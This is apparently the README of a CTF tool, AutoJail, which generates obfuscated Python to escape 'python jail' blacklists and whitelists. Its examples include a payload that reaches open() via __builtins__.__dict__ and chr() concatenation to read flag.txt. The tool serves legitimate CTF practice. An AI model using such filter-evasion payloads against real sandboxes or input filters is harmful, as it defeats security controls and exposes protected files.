# AutoJail Python

AutoJail is a tool for automatically solving python jail CTF challenges. This program takes in a blacklist/whitelist and generates valid python that evaluetes to what you want to achieve without using any blacklisted keywords or only using the whitelisted keywords.

⚠️ This project is still in development ⚠️

## Getting started

```
git pull ...
cd autojail/autojail
python main.py -h
```

## Examples

**Open a file with a blacklist**
```
python main.py -o flag.txt -b open "'" '"'
print(*__builtins__.__dict__[chr(111)+chr(112)+chr(101)+chr(110)](chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)))
```

**Generate strings**
```
python main.py --string HEI --blacklist H c ᶜ 0 7
String:  HEI 	: '%\143'%((int(not())+int(not()))**(int(not())+int(not())+int(not()))+(int(not())+int(not()))**(int(not())+int(not())+int(not())+int(not())+int(not())+int(not())))+'%\143'%(69)+'%\143'%(int(not())+(int(not())+int(not()))**(int(not())+int(not())+int(not()))+(int(not())+int(not()))**(int(not())+int(not())+int(not())+int(not())+int(not())+int(not())))
```

**Create any number using whitelist**
```
python main.py -n 22 -w 0 1 b
0b10110
```


## Usage
```
usage: main.py [-h] [-b [BLACKLIST ...]] [-w [WHITELIST ...]] [-s STRING]
               [-n NUMBER] [-o FILE_PATH]

Autojail is a tool for automatically solving python jail CTF challenges.

options:
  -h, --help            show this help message and exit
  -b [BLACKLIST ...], --blacklist [BLACKLIST ...]
                        A list of blacklisted kwds not allowed.
  -w [WHITELIST ...], --whitelist [WHITELIST ...]
                        A list of whitelisted kwds allowd to use.
  -s STRING, --string STRING
                        Create a string.
  -n NUMBER, --number NUMBER
                        Create a number.
  -o FILE_PATH, --open FILE_PATH
                        Open a file and read it.

```